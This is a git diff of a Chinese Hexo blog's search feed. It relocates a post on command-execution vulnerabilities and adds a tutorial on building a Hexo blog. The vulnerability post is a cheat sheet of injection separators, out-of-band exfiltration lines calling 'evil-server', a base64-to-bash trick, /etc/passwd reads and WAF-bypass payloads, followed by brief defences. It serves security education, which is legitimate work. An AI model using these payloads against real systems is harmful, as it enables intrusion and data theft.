-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css</span></span><br></pre></td></tr></table></figure>
-
+<p>顺便设置下 系统启动设置</p>
 ]]></content>
       <categories>
-        <category>Hexo</category>
+        <category>win系统</category>
       </categories>
       <tags>
-        <tag>博客</tag>
+        <tag>win10</tag>
       </tags>
   </entry>
   <entry>
@@ -783,6 +845,51 @@
       </categories>
       <tags>
         <tag>win10</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行漏洞</title>
+    <url>/posts/a43e8dc0.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
+<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
+<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<p>Linux下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+
+<p>liunx绕开空格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+
+<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -1628,48 +1735,135 @@
       </tags>
   </entry>
   <entry>
-    <title>命令执行漏洞</title>
-    <url>/posts/a43e8dc0.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
-<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
-<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+    <title>Hexo搭建个人博客教程</title>
+    <url>/posts/6e27c1a7.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+Butterfly</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
+<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="搭建准备"><a href="#搭建准备" class="headerlink" title="搭建准备"></a>搭建准备</h2><p>1.基础软件与工具的安装</p>
+<ul>
+<li><a href="https://github.com/">GitHub</a></li>
+<li><a href="https://git-scm.com/">Git</a></li>
+<li><a href="https://hexo.io/zh-cn/">Hexo</a></li>
+<li><a href="https://nodejs.org/en/">Node.js</a></li>
+</ul>
+<p><strong>Node安装</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官网下载，具体安装教程借鉴：https://blog.csdn.net/web18224617243/article/details/123191441</span><br></pre></td></tr></table></figure>
 
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
+<p><strong>Git安装</strong></p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">去官网下载，具有安装教程借鉴：</span><br><span class="line">https://blog.csdn.net/mukes/article/details/115693833</span><br></pre></td></tr></table></figure>
 
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
+<p><strong>Hexo安装</strong></p>
+<p>安装<strong>Hexo</strong>，在<strong>Git Bash</strong>中执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
 
-<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+<p>创建一个新目录，我的是<code>D:\program\blog</code>，并且执行初始化：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init Blog</span><br><span class="line">或</span><br><span class="line">cd Blog &amp;&amp; hexo init</span><br></pre></td></tr></table></figure>
 
-<p>Linux下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+<p>2.本地搭建</p>
+<p>先后执行下面命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
 
-<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
+<p>访问默认地址 <strong><a href="http://localhosy:4000/">http://localhosy:4000</a></strong> 就可以查看到搭建起来的博客，<strong>Ctrl+C</strong>就可以停止服务。</p>
+<p>如果4000端口被占用，使用以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -p 5000 （端口自定义）</span><br></pre></td></tr></table></figure>
 
-<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><ol>
+<li><p>在GitHub上新建一个仓，仓库与你的用户名相同，仓要公开。</p>
+<p>注意： 仓库名称的<strong>前半部分与你的用户名一致</strong>，即 lummod，<strong>后半部分为 yourname.git.io 固定格式</strong>（忽略红色警告，因为我已经创建过了！），可以选择一个readme为说明文件（随便），然后<strong>点击创建仓库</strong></p>
+</li>
+<li><p>在博客目录下，执行以下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm insatll -g hexo-cli</span><br><span class="line">hexo init （如果前面初始化和安装过就不用了）</span><br></pre></td></tr></table></figure></li>
+<li><p>绑定GitHub，添加SSH key，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure>
 
-<p>liunx绕开空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
+<p>添加到 GitHub ，复制密钥文件内容（路径如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到 <a href="https://github.com/settings/keys">New SSH Key</a>即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
 
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+<p>接着输入命令连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
 
-<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
+<p>测试，如果回显返回“You’ve successfully authenticated”即成功。</p>
+</li>
+<li><p>打开根目录下的_config.yml，写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/fengye97/fengye97.github.io.git  #你的仓库地址</span><br><span class="line">  branch: master 你的目录 </span><br><span class="line">  #ps: 要注意空格</span><br></pre></td></tr></table></figure></li>
+<li><p>安装Git部属插件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">日常三连: hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
 
-<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
-<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
+<p>如果成功，输入github域名即可进入</p>
+</li>
+</ol>
+<h2 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h2><p>本步骤需要购买域名，我用的是阿里云，所以就以阿里云为例。</p>
+<p>第一步：在阿里云控制台中，点击解析并添加两条解析记录</p>
+<ol>
+<li><p>添加 CNAME 记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型选择为 CNAME；</span><br><span class="line"></span><br><span class="line">主机记录即域名前缀为www；</span><br><span class="line"></span><br><span class="line">记录值填写为yourname.github.io；</span><br><span class="line"></span><br><span class="line">解析线路，TTL 默认即可。</span><br></pre></td></tr></table></figure></li>
+<li><p>添加 两条A 记录指向 192.30.252.153和192.30.252.154</p>
+<p>类型选择为 A；</p>
+<p>主机记录即域名前缀，填写为@；</p>
+<p>记录值填写为192.30.252.153和192.30.252.154；</p>
+<p>解析线路，境外或谷歌。</p>
+</li>
+</ol>
+<p>A记录类型的记录值为<strong>IPV4</strong>地址，通过ping域名得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping zhou-boop.github.io    #ping + 你的GitHub的网址</span><br></pre></td></tr></table></figure>
 
-<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+<p>第二步：在根目录下的 <strong>source</strong> 文件中新建 <strong>CNAME</strong> 文件，文件中写入你的域名(购买的)，不要加上www。</p>
+<p>第三步：重新部署一下</p>
+<p>在 <strong>Github</strong> 查看 <strong>CNAME</strong> 文件以及网址。</p>
+<p>输入域名就可以直接登录网站了。</p>
+<h1 id="博客配置"><a href="#博客配置" class="headerlink" title="博客配置"></a>博客配置</h1><h2 id="Hexo-博客生成永久链接"><a href="#Hexo-博客生成永久链接" class="headerlink" title="Hexo 博客生成永久链接"></a>Hexo 博客生成永久链接</h2><p>Hexo 文章链接默认的生成规则是：<code>:year/:month/:day/:title</code>，是按照年、月、日、标题来生成的。</p>
+<p>修改链接有助于别人记录，方便自己随时修改文章的内容，只要不改变 footer-matter 中的 id 值，那么文章链接永远不会变。</p>
+<p><strong>安装插件</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
 
-<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
+<p><strong>修改配置文件</strong></p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="comment">## 此处可以自己设置</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink/</span> </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
+<p>在文件中增加配置</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># abbrlink config</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>      <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>        <span class="comment">#support dec(default) and hex</span></span><br><span class="line">  <span class="attr">drafts:</span> <span class="literal">false</span>   <span class="comment">#(true)处理草稿,(false)不处理草稿. false(default) </span></span><br><span class="line">  <span class="comment"># 从目录树生成类别</span></span><br><span class="line">  <span class="comment"># depth: 要生成的目录树的最大深度，应该&gt; 0</span></span><br><span class="line">  <span class="attr">auto_category:</span></span><br><span class="line">     <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#true(default)</span></span><br><span class="line">     <span class="attr">depth:</span>        <span class="comment">#3(default)</span></span><br><span class="line">     <span class="attr">over_write:</span> <span class="literal">false</span> </span><br><span class="line">  <span class="attr">auto_title:</span> <span class="literal">false</span> <span class="comment">#启用自动标题，它可以根据路径自动填充标题</span></span><br><span class="line">  <span class="attr">auto_date:</span> <span class="literal">false</span> <span class="comment">#启用自动日期，它可以根据今天的时间自动填充日期</span></span><br><span class="line">  <span class="attr">force:</span> <span class="literal">false</span> <span class="comment">#启用强制模式，在这种模式下，插件将忽略缓存，并为每个帖子计算缩写链接，即使它已经有缩写链接。 这只会更新 abbrlink 而不是其他前面的变量。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>样式</strong></p>
